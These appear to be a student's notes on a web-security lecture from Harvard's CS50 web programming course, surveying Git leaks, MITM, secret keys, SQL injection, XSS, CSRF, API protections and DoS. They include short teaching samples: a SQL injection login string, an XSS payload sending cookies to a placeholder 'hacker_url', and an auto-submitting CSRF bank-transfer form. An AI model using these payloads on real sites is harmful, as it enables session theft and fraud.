# Security
2019-01-16

**Lecture 11 from CS50's Web Programming with Python and JavaScript by Havard University**

## Git
* Open-Source Software is vulnerable to malicious hackers.
* Private repository is also vulnerable when GitHub account is hacked.
* Two-Factor Authentication
* Sensitive information like a password or a credential can be exposed.

## HTML
* Users can be tricked into fake link
ex) `<a href="url1">url2</a>`

## Flask
* MITM(Man-in-the-Middle) attacks
### Cryptography
* Plaintext
* Ciphertext
* Secret-Key Cryptography
* Public-Key Cryptography (Public Key-Encrpytion), Private Key-Decryption)
ex) HTTPS
* Environment Variables
```
app.config["SECRET_KEY"] = "dHd1bnR5ZWlnaHQ" # Not secure way
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY")
```

## SQL
* Passwords must be encrypted. (Hashing)
* SQL Injection
ex) Password: 1' OR '1' = '1

## APIs
* Authentication
* API Keys
* Rate Limiting (ex: x number of requests per hour)
* Route Authentication

## JavaScript
* Cross-Site Scripting
```
@app.errorhandler(404)
def page_not_found(e):
    return "Not Found: " + request.path

# /<script>alert('hi')</script>
# /<script>doument.write('<img src="hacker_url?cookie="+document.cookie+">")</script>
```
* Most web browsers can detect XSS albeit not perfect.
* You can manually turn off XSS auditor by typing `chrome --disable-xss-auditor`

## Django
* Cross-Site Request Forgery
```
<body onload="document.forms[0].submit()">
    <form action="https://yourbank.com/transfer" method="post">
        <input type="hidden" name="to" value="brian">
        <input type="hidden" name="amt" value="2800">
        <input type="submit" value="Click Here!">
    </form>
</body>
```

## Testing, CI/CD
* Travis CI which has access to private repositories can be compromised, too.
* Third-party services can access your private information via Facebook, etc.

## Scalability
* DoS(Denial-of-Services) Attacts - by one client
* DDoS(Distributed Denial-of-Services) Attacts - by multiple clients